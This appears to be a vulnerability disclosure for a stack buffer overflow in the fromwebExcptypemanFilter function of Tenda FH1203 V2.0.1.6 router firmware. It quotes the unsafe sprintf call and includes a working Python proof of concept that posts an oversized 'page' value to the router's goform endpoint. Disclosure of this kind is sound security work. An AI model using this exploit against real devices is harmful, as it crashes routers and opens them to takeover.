# fromwebExcptypemanFilter

## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2495.html

## Affected version

FH1203 V2.0.1.6

## Vulnerability details


There is a stack buffer overflow vulnerability in  FH1203 V2.0.1.6, located in the **fromwebExcptypemanFilter** function. The function receives the `page` parameter from a POST request. `   sprintf(v8, "firewall_murlexcplist.asp?page=%s", v3);` The statement will cause a buffer overflow. The `page` value provided by the user may exceed the capacity of the `v8` array, thereby triggering this security vulnerability.

![image](https://github.com/user-attachments/assets/6121f8f8-0393-4cdb-a426-384d5eb69753)



## POC

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/webExcptypemanFilter"
payload = b"a"*2000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```
![image](https://github.com/user-attachments/assets/4eaf1bbf-18c0-4c84-80bc-c9768da99e3e)

